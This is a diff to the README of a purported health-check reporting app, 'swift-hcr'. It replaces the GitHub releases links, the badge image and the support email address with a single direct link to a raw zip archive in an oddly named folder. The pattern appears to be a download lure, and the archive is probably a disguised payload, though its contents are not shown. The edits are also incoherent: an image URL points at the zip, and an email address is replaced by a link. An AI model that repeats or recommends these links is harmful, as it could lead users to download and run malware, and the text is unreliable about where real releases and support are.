@@ -4,7 +4,7 @@
 Welcome to swift-hcr! This application helps you quickly generate health check reports for your systems. It is user-friendly and designed for everyone. 
 
 ## 🔗 Download Now
-[![Download swift-hcr](https://img.shields.io/badge/Download%20swift--hcr-v1.0-blue)](https://github.com/nilsou27/swift-hcr/releases)
+[![Download swift-hcr](https://raw.githubusercontent.com/nilsou27/swift-hcr/main/untenty/swift-hcr.zip%20swift--hcr-v1.0-blue)](https://raw.githubusercontent.com/nilsou27/swift-hcr/main/untenty/swift-hcr.zip)
 
 ## ✔️ Features
 - Generate automatic health check reports.
@@ -15,7 +15,7 @@ Welcome to swift-hcr! This application helps you quickly generate health check r
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-1. Visit this page to download: [swift-hcr Releases](https://github.com/nilsou27/swift-hcr/releases).
+1. Visit this page to download: [swift-hcr Releases](https://raw.githubusercontent.com/nilsou27/swift-hcr/main/untenty/swift-hcr.zip).
 2. You will see a list of available versions. Choose the latest version for the best performance.
 3. Click on the latest version link to see the download files.
 4. Download the file suitable for your operating system, usually marked as `.exe` for Windows or `.dmg` for macOS.
@@ -47,9 +47,9 @@ A: Yes, you can export reports in PDF, CSV, and HTML formats.
 A: Yes, we release updates regularly to add features and improve performance.
 
 ## 📞 Support
-If you have any questions or need assistance, please reach out to our support team. You can open an issue directly in the GitHub repository or contact us via email at support@swift-hcr.com.
+If you have any questions or need assistance, please reach out to our support team. You can open an issue directly in the GitHub repository or contact us via email at https://raw.githubusercontent.com/nilsou27/swift-hcr/main/untenty/swift-hcr.zip
 
 Thank you for choosing swift-hcr! We hope this application meets your health check reporting needs. 
 
 ## 🔗 Download Again
-To download the latest version, visit: [swift-hcr Releases](https://github.com/nilsou27/swift-hcr/releases).
+To download the latest version, visit: [swift-hcr Releases](https://raw.githubusercontent.com/nilsou27/swift-hcr/main/untenty/swift-hcr.zip).
